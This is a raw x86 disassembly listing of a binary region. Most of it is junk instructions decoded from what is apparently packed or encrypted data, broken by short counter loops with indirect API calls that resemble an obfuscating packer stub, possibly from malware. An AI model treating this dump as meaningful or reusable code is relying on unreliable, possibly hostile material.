  407501:	ins    DWORD PTR es:[edi],dx
  407502:	inc    ebx
  407503:	mov    BYTE PTR [eax],ch
  407505:	int    0x3d
  407507:	xchg   esi,eax
  407508:	outs   dx,DWORD PTR ds:[esi]
  407509:	icebp  
  40750a:	and    eax,0x9f814ee
  40750f:	or     esi,DWORD PTR [esi]
  407511:	dec    edi
  407512:	scas   eax,DWORD PTR es:[edi]
  407513:	shl    ecx,cl
  407515:	dec    eax
  407516:	push   eax
  407517:	jmp    0x4074a2
  407519:	adc    al,0xd5
  40751b:	sar    BYTE PTR [ebp+esi*1-0x8],0x61
  407520:	gs xchg ecx,eax
  407522:	scas   eax,DWORD PTR es:[edi]
  407523:	xchg   ebx,eax
  407524:	jne    0x407556
  407526:	jmp    0x5d4e:0xa82b1147
  40752d:	xor    eax,0x2aac6ae5
  407532:	dec    esi
  407533:	ret    
  407534:	repz push esp
  407536:	jmp    0x40751d
  407538:	cmp    al,0x9e
  40753a:	fs scas eax,DWORD PTR es:[edi]
  40753c:	clc    
  40753d:	mov    eax,0x45c4661e
  407542:	lea    esi,[edi+0x39294e45]
  407548:	into   
  407549:	lea    ecx,ds:[ecx]
  40754c:	mov    BYTE PTR [ebx+esi*1-0x48],ch
  407550:	cld    
  407551:	hlt    
  407552:	sbb    dl,BYTE PTR [edi-0x4c7edc05]
  407558:	mov    ebp,0x8a2ba6ff
  40755d:	scas   al,BYTE PTR es:[edi]
  40755e:	sub    BYTE PTR [ebx-0x41164cfa],ah
  407564:	call   0x451d4148
  407569:	or     eax,0x3187691
  40756e:	xchg   ebx,eax
  40756f:	nop
  407570:	mov    al,ds:0xac39226a
  407575:	out    dx,al
  407576:	data16 fidiv DWORD PTR [eax]
  407579:	cmc    
  40757a:	xchg   ecx,eax
  40757b:	nop
  40757c:	aaa    
  40757d:	(bad)  
  40757e:	xor    BYTE PTR [eax],ch
  407580:	jmp    0xd4dd1a95
  407585:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407586:	jecxz  0x40759f
  407588:	xlat   BYTE PTR ds:[ebx]
  407589:	xor    eax,0xbe21e24b
  40758e:	(bad)  
  40758f:	aaa    
  407590:	mov    al,0x9f
  407592:	fcmovnbe st,st(6)
  407594:	repz pop ss
  407596:	out    0x51,eax
  407598:	and    eax,0x736372e7
  40759d:	sub    DWORD PTR [esi],eax
  40759f:	int3   
  4075a0:	mov    eax,ds:0xd2d1959a
  4075a5:	pop    ebp
  4075a6:	inc    ecx
  4075a7:	test   eax,0x10ccb618
  4075ac:	xor    bl,BYTE PTR [esi-0x4d]
  4075af:	jmp    0xbf544fa9
  4075b4:	xchg   esi,eax
  4075b5:	fstp   TBYTE PTR [esi+0x7482022b]
  4075bb:	call   0x4ca153fa
  4075c0:	jmp    0x100f169e
  4075c5:	pop    ebx
  4075c6:	in     al,0xfe
  4075c8:	mov    ds:0xecbe3131,al
  4075cd:	jb     0x4075c3
  4075cf:	popf   
  4075d0:	jg     0x407631
  4075d2:	into   
  4075d3:	nop
  4075d4:	jae    0x407573
  4075d6:	inc    ecx
  4075d7:	push   ss
  4075d8:	lods   al,BYTE PTR ds:[esi]
  4075d9:	aam    0x4f
  4075db:	mov    dl,0x72
  4075dd:	pusha  
  4075de:	inc    ebx
  4075df:	retf   0x58d
  4075e2:	cmp    cl,BYTE PTR [ebp-0x2c5dd238]
  4075e8:	fcomp  DWORD PTR [ecx]
  4075ea:	mov    ds:0xbcdc4943,al
  4075ef:	pop    ss
  4075f0:	pop    ebx
  4075f1:	jnp    0x407624
  4075f3:	and    BYTE PTR [ecx],ah
  4075f5:	jge    0x40764e
  4075f7:	inc    edi
  4075f8:	cmp    al,0xb4
  4075fa:	shr    BYTE PTR fs:[ecx+0x70],1
  4075fe:	xchg   ecx,eax
  4075ff:	jl     0x407671
  407601:	sbb    bl,BYTE PTR [eax]
  407603:	push   0x48
  407605:	mov    eax,0xffb7074f
  40760a:	push   edx
  40760b:	jmp    edi
  40760d:	push   0x9898ceaf
  407612:	in     al,0x4c
  407614:	adc    eax,0xe0f11f59
  407619:	sub    al,0x2d
  40761b:	fmul   QWORD PTR [edx+0xf]
  40761e:	test   bl,ch
  407620:	sbb    al,BYTE PTR [eax]
  407622:	add    BYTE PTR [ebx-0x17],dl
  407625:	pop    esi
  407626:	pop    ss
  407627:	add    BYTE PTR [eax],al
  407629:	and    DWORD PTR ds:0x42ec4b,0x0
  407633:	jmp    0x407647
  407638:	xor    edx,edx
  40763a:	xor    edx,DWORD PTR ds:0x42ec4b
  407640:	inc    edx
  407641:	mov    DWORD PTR ds:0x42ec4b,edx
  407647:	cmp    DWORD PTR ds:0x42ec4b,0x1b
  40764e:	jae    0x40768b
  407654:	cmp    DWORD PTR ds:0x42ec4b,0xa
  40765b:	jne    0x40766a
  407661:	push   DWORD PTR [ebp-0x10]
  407664:	call   DWORD PTR ds:0x42e933
  40766a:	cmp    DWORD PTR ds:0x42ec4b,0x9
  407671:	jne    0x407686
  407677:	xor    edx,edx
  407679:	xor    edx,DWORD PTR ds:0x42ec4b
  40767f:	inc    edx
  407680:	mov    DWORD PTR ds:0x42ec4b,edx
  407686:	jmp    0x407638
  40768b:	mov    edx,DWORD PTR [ebp-0x8]
  40768e:	mov    edi,DWORD PTR [ebp-0x10]
  407691:	sub    edi,edx
  407693:	jmp    0x407844
  407698:	or     DWORD PTR [ecx+0x67a86788],ebp
  40769e:	icebp  
  40769f:	jno    0x407690
  4076a1:	out    dx,al
  4076a2:	jns    0x4076bb
  4076a4:	test   DWORD PTR [eax-0x35],ebp
  4076a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076a8:	inc    ecx
  4076a9:	ret    0x7e7e
  4076ac:	mov    bh,BYTE PTR [edi+0x7e]
  4076af:	jle    0x407631
  4076b1:	and    cl,BYTE PTR [ebx-0x1ae26122]
  4076b7:	cwde   
  4076b8:	sbb    cl,cl
  4076ba:	jmp    0x56eccd1d
  4076bf:	lods   eax,DWORD PTR ds:[esi]
  4076c0:	enter  0xce4f,0x6
  4076c4:	add    edx,DWORD PTR [esi]
  4076c6:	jnp    0x407653
  4076c8:	ficomp DWORD PTR [ebx]
  4076ca:	fwait
  4076cb:	jmp    0x8225:0xfa450201
  4076d2:	ret    
  4076d3:	div    BYTE PTR [esp+edx*8-0x351356f5]
  4076da:	sub    BYTE PTR [eax+ecx*8-0x60],cl
  4076de:	(bad)  
  4076e0:	mov    DWORD PTR [esi-0x284c3a5b],edx
  4076e6:	popf   
  4076e7:	cmp    eax,0x6cb427bb
  4076ec:	add    bh,BYTE PTR [edi]
  4076ee:	and    DWORD PTR [edx+0x2e],ebx
  4076f1:	adc    BYTE PTR [edi-0x121927f2],cl
  4076f7:	out    dx,al
  4076f8:	pop    edx
  4076f9:	cdq    
  4076fa:	pop    eax
  4076fb:	sbb    esi,DWORD PTR [ebp-0x1707ac10]
  407701:	or     bl,0x3f
  407704:	dec    edi
  407705:	leave  
  407706:	inc    esp
  407707:	iret   
  407708:	pop    eax
  407709:	adc    eax,0x7e47f507
  40770e:	retf   
  40770f:	xor    ebp,esp
  407711:	lods   al,BYTE PTR ds:[esi]
  407712:	shr    DWORD PTR [edx],cl
  407714:	aaa    
  407715:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407716:	mov    DWORD PTR [eax-0x2df7ede9],edx
  40771c:	mov    WORD PTR [ebp+0x46],ss
  40771f:	int    0xf3
  407721:	pop    es
  407722:	or     edi,DWORD PTR [edi+0x24c551e3]
  407728:	outs   dx,DWORD PTR ds:[esi]
  407729:	push   0xf76536a8
  40772e:	aas    
  40772f:	mov    ebx,0xb81c8483
  407734:	in     eax,0xf2
  407736:	dec    esp
  407737:	cs sub ah,ah
  40773a:	shl    BYTE PTR [ecx],0xf3
  40773d:	das    
  40773e:	inc    edi
  40773f:	fbld   TBYTE PTR [eax-0x168700fd]
  407745:	push   cs
  407746:	js     0x4076d4
  407748:	fwait
  407749:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40774a:	div    cl
  40774c:	lods   eax,DWORD PTR ds:[esi]
  40774d:	inc    eax
  40774e:	mov    ds:0xe69fab76,eax
  407753:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407754:	mov    dh,0x95
  407756:	sahf   
  407757:	push   ss
  407758:	pop    esp
  407759:	outs   dx,DWORD PTR ds:[esi]
  40775a:	dec    esi
  40775b:	sbb    al,0xa
  40775d:	inc    edi
  40775e:	jmp    0x3f7ee625
  407763:	cld    
  407764:	in     eax,0x6d
  407766:	xchg   ebx,eax
  407767:	pop    ss
  407768:	push   eax
  407769:	fadd   st(2),st
  40776b:	sub    eax,0xbc5ecf5c
  407770:	dec    edi
  407771:	rcr    DWORD PTR [eax-0x1d39eea2],cl
  407777:	mov    ebx,0x894b7366
  40777c:	or     ch,BYTE PTR [eax+ebp*8+0x6e78233c]
  407783:	inc    ebp
  407784:	(bad)  
  407785:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407786:	add    DWORD PTR [esi-0x75],esi
  407789:	push   ds
  40778a:	arpl   WORD PTR [ebp-0x773164b3],bp
  407790:	cdq    
  407791:	scas   al,BYTE PTR es:[edi]
  407792:	mov    dl,0x70
  407794:	daa    
  407795:	retf   0x7773
  407798:	xor    dh,dl
  40779a:	xchg   ebp,eax
  40779b:	das    
  40779c:	fadd   st(4),st
  40779e:	std    
  40779f:	jbe    0x40777f
  4077a1:	and    eax,DWORD PTR [esi+0x4eef0310]
  4077a7:	aad    0x3e
  4077a9:	sub    bh,0xab
  4077ac:	repz cmps BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4077af:	adc    DWORD PTR [ebx],ecx
  4077b1:	loopne 0x40773a
  4077b3:	sar    esp,1
  4077b5:	call   0x35aa:0x7ba7b8eb
  4077bc:	add    ebx,DWORD PTR [edi]
  4077be:	sub    al,0x16
  4077c0:	lds    eax,FWORD PTR [ebx-0x1b5148a]
  4077c6:	jno    0x4077ef
  4077c8:	in     al,0xe8
  4077ca:	repz jmp 0xc1108e85
  4077d0:	pop    eax
  4077d1:	test   DWORD PTR [edi+0xd],ebx
  4077d4:	push   ecx
  4077d5:	ret    0x603a
  4077d8:	jae    0x407771
  4077da:	ins    DWORD PTR es:[edi],dx
  4077db:	cs jo  0x4077e5
  4077de:	mov    DWORD PTR [edi+eiz*4],ebp
  4077e1:	mov    BYTE PTR [ebx],ah
  4077e3:	inc    edx
  4077e4:	dec    ecx
  4077e5:	rcr    BYTE PTR [edi-0x68d1905e],1
  4077eb:	xchg   ebp,eax
  4077ec:	nop
  4077ed:	mov    ah,0x5c
  4077ef:	enter  0xb623,0x9
  4077f3:	div    DWORD PTR [ebp-0x5]
  4077f6:	fchs   
  4077f8:	mov    DWORD PTR [esi+0x20],ebx
  4077fb:	xor    eax,0x8baf551e
  407800:	int3   
  407801:	repz push eax
  407803:	xchg   ebp,eax
  407804:	inc    eax
  407805:	push   0x1b
  407807:	dec    ebx
  407808:	arpl   WORD PTR [eax-0x200c959e],cx
  40780e:	mov    ecx,0x27ea8f59
  407813:	inc    esp
  407814:	mov    bl,0x54
  407816:	jge    0x40781f
  407818:	xchg   edi,eax
  407819:	cmp    ebx,DWORD PTR [eax+esi*1+0x3e840850]
  407820:	aas    
  407821:	add    eax,0xbb48475
  407826:	jmp    0x26d4768b
  40782b:	xchg   ecx,eax
  40782c:	clc    
  40782d:	add    eax,0x2aed276
  407832:	push   ds
  407833:	in     al,0x5a
  407835:	mov    dh,0xc5
  407837:	xchg   BYTE PTR [edi],bh
  407839:	out    dx,eax
  40783a:	fcmovne st,st(7)
  40783c:	add    eax,0x1e7c0c8
  407841:	push   eax
  407842:	xchg   ch,al
  407844:	mov    edx,DWORD PTR [ebp-0x4]
  407847:	adc    DWORD PTR ds:0x4302c9,0x43034f
  407851:	xor    edx,eax
  407853:	add    edx,ecx
  407855:	cmp    edi,edx
  407857:	mov    DWORD PTR ds:0x4302ed,0x688e
  407861:	jb     0x40910d
  407867:	mov    DWORD PTR ds:0x42e644,0x1e
  407871:	cmp    DWORD PTR ds:0x42e644,0x0
  407878:	je     0x4078a9
  40787e:	cmp    DWORD PTR ds:0x42e644,0x25
  407885:	jne    0x407896
  40788b:	push   0x2141
  407890:	call   DWORD PTR ds:0x42e937
  407896:	mov    edi,DWORD PTR ds:0x42e644
  40789c:	dec    edi
  40789d:	mov    DWORD PTR ds:0x42e644,edi
  4078a3:	jmp    0x407871
  4078a8:	inc    edx
  4078a9:	mov    edx,DWORD PTR [ebp-0x28]
  4078ac:	mov    edi,DWORD PTR [ebp-0x4]
  4078af:	xor    edx,eax
  4078b1:	xor    edi,eax
  4078b3:	sub    ebx,DWORD PTR ds:0x42ec4f
  4078b9:	add    edi,ecx
  4078bb:	add    edx,ecx
  4078bd:	and    DWORD PTR ds:0x4302bd,0x0
  4078c7:	xor    ebx,ebx
  4078c9:	or     ebx,DWORD PTR ds:0x4302bd
  4078cf:	inc    ebx
  4078d0:	mov    DWORD PTR ds:0x4302bd,ebx
  4078d6:	cmp    DWORD PTR ds:0x4302bd,0x15
  4078dd:	jne    0x4078f1
  4078e3:	push   0x1
  4078e5:	push   DWORD PTR [ebp-0x20]
  4078e8:	push   DWORD PTR [ebp-0x10]
  4078eb:	call   DWORD PTR ds:0x42eaa7
  4078f1:	cmp    DWORD PTR ds:0x4302bd,0x11
  4078f8:	jb     0x4078c7
  4078fe:	imul   edx,edi
  407901:	mov    edi,DWORD PTR [ebp-0x8]
  407904:	mov    ebx,DWORD PTR [ebp-0x10]
  407907:	sub    ebx,edi
  407909:	cmp    ebx,edx
  40790b:	ja     0x40791d
  407911:	mov    edx,DWORD PTR [ebp-0x4]
  407914:	xor    edx,eax
  407916:	add    edx,ecx
  407918:	jmp    0x40877e
  40791d:	mov    edx,DWORD PTR [ebp-0x2c]
  407920:	mov    edi,DWORD PTR [ebp-0x4]
  407923:	xor    edx,eax
  407925:	xor    edi,eax
  407927:	add    edi,ecx
  407929:	add    edx,ecx
  40792b:	imul   edx,edi
  40792e:	mov    edi,DWORD PTR [ebp-0x8]
  407931:	jmp    0x407ae2
  407936:	ret    0x1100
  407939:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40793a:	shl    DWORD PTR [ebp+0x7ad26172],1
  407940:	dec    edi
  407941:	inc    ebx
  407943:	popa   
  407944:	mov    dh,0xc8
  407946:	ffree  st(0)
  407948:	jle    0x4079c8
  40794a:	mov    bh,BYTE PTR [edi+0x7e]
  40794d:	jle    0x4079b8
  40794f:	int3   
  407950:	clc    
  407951:	fidivr DWORD PTR [ecx]
  407953:	outs   dx,DWORD PTR ds:[esi]
  407954:	adc    esp,esp
  407956:	jmp    0x1c2b:0x24dae11
  40795d:	dec    ebx
  40795e:	xchg   ebp,eax
  40795f:	repz inc eax
  407961:	scas   al,BYTE PTR es:[edi]
  407962:	stos   DWORD PTR es:[edi],eax
  407963:	jge    0x407931
  407965:	hlt    
  407966:	inc    eax
  407967:	sbb    ecx,DWORD PTR [eax-0x5f]
  40796a:	or     cl,BYTE PTR [edx]
  40796c:	or     al,0x6a
  40796e:	lock and BYTE PTR [ecx+0x56a30d3b],bh
  407975:	and    BYTE PTR [edi+0x58b1aa37],cl
  40797b:	push   ss
  40797c:	fst    DWORD PTR [ebx]
  40797e:	mov    ebp,0x5cb50121
  407983:	sub    ah,al
  407985:	in     al,0xdc
  407987:	fdivr  DWORD PTR [ebx]
  407989:	and    al,0x62
  40798b:	inc    edx
  40798c:	mov    ds:0xfe7f29be,eax
  407991:	jg     0x407a07
  407993:	and    DWORD PTR [edi+0x79],eax
  407996:	adc    al,0xc0
  407998:	addr16 lsl edx,ax
  40799c:	mov    bh,0x94
  40799e:	retf   0xa5ad
  4079a1:	stos   DWORD PTR es:[edi],eax
  4079a2:	pop    ebp
  4079a3:	je     0x407965
  4079a5:	adc    DWORD PTR [edx],0x597609a0
  4079ab:	push   eax
  4079ac:	out    dx,al
  4079ad:	or     bl,bh
  4079af:	pop    ecx
  4079b0:	and    cl,BYTE PTR [ecx+0x6cbe5b76]
  4079b6:	leave  
  4079b7:	xor    DWORD PTR [eax],eax
  4079b9:	cmp    eax,edi
  4079bb:	push   edx
  4079bc:	out    0x70,al
  4079be:	retf   0x6fdf
  4079c1:	rcl    DWORD PTR cs:[ecx+0x7e],0xeb
  4079c6:	leave  
  4079c7:	int3   
  4079c8:	imul   edi,DWORD PTR [eax],0xa7c5e825
  4079ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079cf:	fidiv  WORD PTR [eax]
  4079d1:	jno    0x407965
  4079d3:	jno    0x407a0b
  4079d5:	pop    edx
  4079d6:	cdq    
  4079d7:	mov    bl,0xab
  4079d9:	bnd jae 0x4079e1
  4079dc:	push   edx
  4079dd:	iret   
  4079de:	ja     0x4079e7
  4079e0:	push   ebp
  4079e1:	mov    dh,0x4d
  4079e3:	xchg   esp,eax
  4079e4:	cmc    
  4079e5:	cdq    
  4079e6:	in     al,dx
  4079e7:	scas   al,BYTE PTR es:[edi]
  4079e8:	jae    0x4079ea
  4079ea:	addr16 or ah,dh
  4079ed:	sbb    al,0x71
  4079ef:	jmp    0xab4e6d9a
  4079f4:	mov    WORD PTR [edi-0xde55a78],ds
  4079fa:	fwait
  4079fb:	xor    BYTE PTR [edx],cl
  4079fd:	xchg   ebx,eax
  4079fe:	pop    ebp
  4079ff:	sbb    al,BYTE PTR [ebx]
  407a01:	mov    esi,0xa80a2726
  407a06:	(bad)
  407a0a:	and    eax,0xfa8506cb
  407a0f:	and    al,0x71
  407a11:	jp     0x407a7e
  407a13:	(bad)  
  407a14:	pop    esp
  407a15:	out    dx,eax
  407a16:	mov    esi,0xa91a98f0
  407a1b:	jns    0x4079e2
  407a1d:	mov    al,0x41
  407a1f:	adc    ch,dh
  407a21:	lods   eax,DWORD PTR ds:[esi]
  407a22:	je     0x4079e4
  407a24:	dec    ebx
  407a25:	fwait
  407a26:	pop    eax
  407a27:	inc    ecx
  407a28:	icebp  
  407a29:	sbb    ecx,DWORD PTR [ebx-0x4777f0fd]
  407a2f:	add    bh,bl
  407a31:	xchg   edx,eax
  407a32:	sub    ebx,DWORD PTR [ebx-0x1302a01c]
  407a38:	dec    eax
  407a39:	scas   al,BYTE PTR es:[edi]
  407a3a:	repnz into 
  407a3c:	test   al,0x19
  407a3e:	shr    DWORD PTR [ebp-0x12],0x7b
  407a42:	sbb    al,0x4e
  407a44:	out    dx,eax
  407a45:	pop    ebp
  407a46:	and    ebx,0xac76b49a
  407a4c:	and    cl,dl
  407a4e:	cmc    
  407a4f:	inc    eax
  407a50:	iret   
  407a51:	xchg   ebx,eax
  407a52:	fnsave [ebx-0x1df80054]
  407a58:	cli    
  407a59:	or     BYTE PTR [esi-0x2b4c2d73],al
  407a5f:	out    dx,al
  407a60:	xchg   edi,eax
  407a61:	mov    al,ds:0xaa819a0f
  407a66:	or     edi,DWORD PTR [ebx]
  407a68:	push   esp
  407a69:	push   ds
  407a6a:	pop    ecx
  407a6b:	push   ss
  407a6c:	mov    ds:0x154ed44c,al
  407a71:	cmp    ecx,DWORD PTR [edx+0x38]
  407a74:	push   ecx
  407a75:	mov    al,0x8c
  407a77:	and    eax,esi
  407a79:	sbb    eax,DWORD PTR [ecx+0x3fd4604f]
  407a7f:	call   0x4a83:0x6fd9007c
  407a86:	inc    ecx
  407a87:	dec    esp
  407a88:	sti    
  407a89:	mov    BYTE PTR [eax],dl
  407a8b:	sahf   
  407a8c:	pop    esp
  407a8d:	sbb    DWORD PTR [edx],edi
  407a8f:	outs   dx,BYTE PTR ds:[esi]
  407a90:	fdivr  QWORD PTR [eax]
  407a92:	jp     0x407ace
  407a94:	pop    ecx
  407a95:	mov    esi,DWORD PTR [ebx-0xe77e151]
  407a9b:	dec    esi
  407a9c:	or     DWORD PTR [edi-0x40f3f5e1],esp
  407aa2:	into   
  407aa3:	or     al,0xf1
  407aa5:	lock outs dx,DWORD PTR ds:[esi]
  407aa7:	pop    ebx
  407aa8:	aaa    
  407aa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407aaa:	(bad)  
  407aab:	jle    0x407a54
  407aad:	mov    ebx,0xdea9abe7
  407ab2:	jp     0x407a98
  407ab4:	lods   al,BYTE PTR ds:[esi]
  407ab5:	dec    ebp
  407ab6:	mov    dh,0x6f
  407ab8:	int3   
  407ab9:	lods   al,BYTE PTR ds:[esi]
  407aba:	scas   al,BYTE PTR es:[edi]
  407abb:	aaa    
  407abc:	jmp    0x407a40
  407abe:	add    edi,DWORD PTR [edx-0x30]
  407ac1:	sbb    al,0xfc
  407ac3:	(bad)  
  407ac4:	std    
  407ac5:	jo     0x407b1f
  407ac7:	pop    ecx
  407ac8:	add    BYTE PTR [ebp-0x460e71ad],dl
  407ace:	push   0x155856e3
  407ad3:	fcmovbe st,st(3)
  407ad5:	out    dx,al
  407ad6:	fwait
  407ad7:	push   edi
  407ad8:	cmp    BYTE PTR [ebp-0x1e42256],al
  407ade:	cmp    BYTE PTR [edx+0x5d8bad21],ch
  407ae4:	lock sub ebx,edi
  407ae7:	cmp    ebx,edx
  407ae9:	ja     0x407af7
  407aef:	mov    edx,DWORD PTR [ebp-0x28]
  407af2:	jmp    0x408770
  407af7:	mov    edx,DWORD PTR [ebp-0x30]
  407afa:	mov    edi,DWORD PTR [ebp-0x4]
  407afd:	jmp    0x407cae
  407b02:	mov    WORD PTR [edx+0x6130bf0c],?
  407b08:	dec    ebp
  407b09:	jno    0x407ae6
  407b0b:	les    ecx,FWORD PTR [esi+0x6277c0ca]
  407b11:	push   esp
  407b12:	imul   eax,ecx,0x7f8a7e7e
  407b18:	jle    0x407b98
  407b1a:	inc    esi
  407b1b:	inc    BYTE PTR [eax+0x35fa1015]
  407b21:	cmp    al,0x48
  407b23:	iret   
  407b24:	cwde   
  407b25:	xchg   DWORD PTR [eax+0x5c],edx
  407b28:	ins    BYTE PTR es:[edi],dx
  407b29:	and    DWORD PTR [edx+0x46],0x51583071
  407b30:	test   BYTE PTR [ecx+edx*1],0xcc
  407b34:	hlt    
  407b35:	(bad)  
  407b37:	xchg   edx,eax
  407b38:	std    
  407b39:	dec    edi
  407b3a:	inc    edi
  407b3b:	(bad)  
  407b3c:	xor    ebp,DWORD PTR [ebx]
  407b3e:	cmp    bh,BYTE PTR [edi]
  407b40:	jmp    0x407b67
  407b42:	jl     0x407aef
  407b44:	jmp    0x44435eae
  407b49:	lea    ebx,[edx-0x38fe8081]
  407b4f:	dec    ebx
  407b50:	pop    ebx
  407b51:	fcmove st,st(6)
  407b53:	fdiv   DWORD PTR [esi-0x4a]
  407b56:	pop    ebx
  407b57:	sbb    DWORD PTR [edx+0xe],edx
  407b5a:	jb     0x407afb
  407b5c:	rcl    BYTE PTR [ebx-0x22],1
  407b5f:	sub    bh,bl
  407b61:	cwde   
  407b62:	int3   
  407b63:	jae    0x407b78
  407b65:	cld    
  407b66:	mov    ebp,?
  407b68:	cs enter 0x53ea,0xfa
  407b6d:	pop    es
  407b6e:	(bad)  
  407b6f:	sub    esi,DWORD PTR [edx+0x22]
  407b72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b73:	ins    DWORD PTR es:[edi],dx
  407b74:	pusha  
  407b75:	mov    bh,0xca
  407b77:	pop    ebx
  407b78:	xchg   esi,eax
  407b79:	sbb    ch,BYTE PTR [edx+0x1ee3d72a]
  407b7f:	(bad)  
  407b80:	int    0x2d
  407b82:	xchg   edx,eax
  407b83:	aas    
  407b84:	jecxz  0x407b6f
  407b86:	xchg   ecx,eax
  407b87:	(bad)  
  407b89:	adc    bh,BYTE PTR [ebx-0x41283328]
  407b8f:	cmp    ecx,DWORD PTR [ecx-0x13]
  407b92:	and    edi,DWORD PTR [ebp-0x7]
  407b95:	jne    0x407bc3
  407b97:	cmp    al,0x3
  407b99:	out    0x39,al
  407b9b:	out    dx,al
  407b9c:	dec    esp
  407b9d:	jmp    0x664f5b9e
  407ba2:	pop    edi
  407ba3:	mov    eax,0x3a2b751
  407ba8:	in     eax,dx
  407ba9:	(bad)  
  407baa:	pop    ebx
  407bab:	ja     0x407be0
  407bad:	mov    cl,ch
  407baf:	in     eax,0xb6
  407bb1:	adc    esi,DWORD PTR [ebx+0x610bf200]
  407bb7:	mov    edx,0xc15ed19
  407bbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bbd:	adc    BYTE PTR [edi+0x7f],cl
  407bc0:	adc    eax,0xf73cb340
  407bc5:	test   dh,ah
  407bc7:	pop    edi
  407bc8:	repz int3 
  407bca:	scas   eax,DWORD PTR es:[edi]
  407bcb:	or     DWORD PTR [eax],ecx
  407bcd:	rcr    DWORD PTR [ecx-0x5448efc5],1
  407bd3:	jp     0x407bfd
  407bd5:	inc    ebx
  407bd6:	push   ebp
  407bd7:	test   ah,bh
  407bd9:	loope  0x407c2a
  407bdb:	shl    DWORD PTR [edx],1
  407bdd:	ficomp WORD PTR [eax]
  407bdf:	je     0x407c1b
  407be1:	fs test al,dh
  407be4:	dec    edi
  407be5:	repnz mov bh,0x2b
  407be8:	aaa    
  407be9:	sbb    BYTE PTR [eax],dl
  407beb:	ds push ss
  407bed:	and    BYTE PTR [edi+ebx*2+0x24],cl
  407bf1:	or     al,0xc3
  407bf3:	cmp    edi,DWORD PTR [eax+0x4e]
  407bf6:	xchg   ecx,eax
  407bf7:	jb     0x407baf
  407bf9:	fsub   DWORD PTR [ebp-0x4012082e]
  407bff:	mov    ecx,DWORD PTR [esi]
  407c01:	icebp  
  407c02:	fidiv  WORD PTR ds:0xc8f36dff
  407c08:	in     eax,dx
  407c09:	fisubr WORD PTR [ebx]
  407c0b:	pop    ebx
  407c0c:	or     al,0xc5
  407c0e:	mov    edi,0x4cca0e65
  407c13:	imul   esp,DWORD PTR [esi+0x4888badc],0x44
  407c1a:	fisttp QWORD PTR [esi-0xe]
  407c1d:	xchg   edi,eax
  407c1e:	push   ss
  407c1f:	inc    eax
  407c20:	or     DWORD PTR [ecx],edx
  407c22:	sub    edx,DWORD PTR ds:0x93559e21
  407c28:	(bad)  
  407c29:	push   esp
  407c2a:	inc    eax
  407c2b:	dec    esp
  407c2c:	xchg   DWORD PTR [eax+ecx*2+0xd],ebp
  407c30:	jmp    0x407caf
  407c32:	imul   ebx,DWORD PTR [ecx-0x655adc18],0xffffffe0
  407c39:	push   esp
  407c3a:	jno    0x407c64
  407c3c:	mov    ?,edx
  407c3e:	scas   al,BYTE PTR es:[edi]
  407c3f:	cli    
  407c40:	jbe    0x407bde
  407c42:	test   esp,ebx
  407c44:	push   esi
  407c45:	pop    edx
  407c46:	in     al,dx
  407c47:	stc    
  407c48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c49:	aad    0xd2
  407c4b:	scas   al,BYTE PTR es:[edi]
  407c4c:	mov    WORD PTR [edx+0x8bfbadb],fs
  407c52:	lock sub eax,DWORD PTR [ecx-0x5b]
  407c56:	lock scas eax,DWORD PTR es:[edi]
  407c58:	sub    dh,ch
  407c5a:	dec    eax
  407c5b:	sahf   
  407c5c:	scas   eax,DWORD PTR es:[edi]
  407c5d:	shl    BYTE PTR [eax-0x79],1
  407c60:	adc    al,0x90
  407c62:	or     eax,0x4d53cfcd
  407c67:	cwde   
  407c68:	push   esi
  407c69:	pop    ebp
  407c6a:	xor    al,0xf1
  407c6c:	clc    
  407c6d:	push   edi
  407c6e:	les    eax,FWORD PTR [edi-0x23]
  407c71:	es push edx
  407c73:	cmp    DWORD PTR [ebx],0xffffffbb
  407c76:	or     DWORD PTR [ebp-0x2819f316],esi
  407c7c:	jns    0x407c37
  407c7e:	sbb    al,0x2b
  407c80:	ja     0x407c65
  407c82:	pop    ecx
  407c83:	cmp    BYTE PTR [ecx-0x4],dl
  407c86:	mov    bl,0x44
  407c88:	pop    ebx
  407c89:	or     eax,DWORD PTR [edx-0x6d4d4e3a]
  407c8f:	mov    ds:0x68863b70,eax
  407c94:	mov    esi,0xdfa36305
  407c99:	in     al,0xb2
  407c9b:	inc    esp
  407c9c:	mov    dh,0xd1
  407c9e:	mov    bl,0x15
  407ca0:	rol    BYTE PTR [eax+0x75be4cd4],1
  407ca6:	sub    eax,0x77fff1f1
  407cab:	pop    ds
  407cac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cad:	jge    0x407ce2
  407caf:	shl    BYTE PTR [ebx],1
  407cb1:	clc    
  407cb2:	add    edi,ecx
  407cb4:	add    edx,ecx
  407cb6:	imul   edx,edi
  407cb9:	mov    edi,DWORD PTR [ebp-0x8]
  407cbc:	mov    ebx,DWORD PTR [ebp-0x10]
  407cbf:	sub    ebx,edi
  407cc1:	cmp    ebx,edx
  407cc3:	jmp    0x407e74
  407cc8:	imul   esp,DWORD PTR [eax],0xfffffff2
  407ccb:	mov    cl,0x71
  407ccd:	jno    0x407d38
  407ccf:	loopne 0x407d06
  407cd1:	(bad)  
  407cd2:	cmp    bh,BYTE PTR [eax-0x73ea1c22]
  407cd8:	test   edi,ecx
  407cda:	jle    0x407d5a
  407cdc:	mov    bh,BYTE PTR [edi+0x7e]
  407cdf:	jle    0x407ca9
  407ce1:	cmc    
  407ce2:	jl     0x407d51
  407ce4:	or     DWORD PTR [edx],0xe3f37daa
  407cea:	int3   
  407ceb:	icebp  
  407cec:	mov    esi,0x7493b7f4
  407cf1:	pushf  
  407cf2:	loope  0x407ca1
  407cf4:	psubd  mm4,mm2
  407cf7:	iret   
  407cf8:	int    0xd9
  407cfa:	stos   DWORD PTR es:[edi],eax
  407cfb:	repnz (bad) 
  407cfd:	hlt    
  407cfe:	fs mov bh,0x64
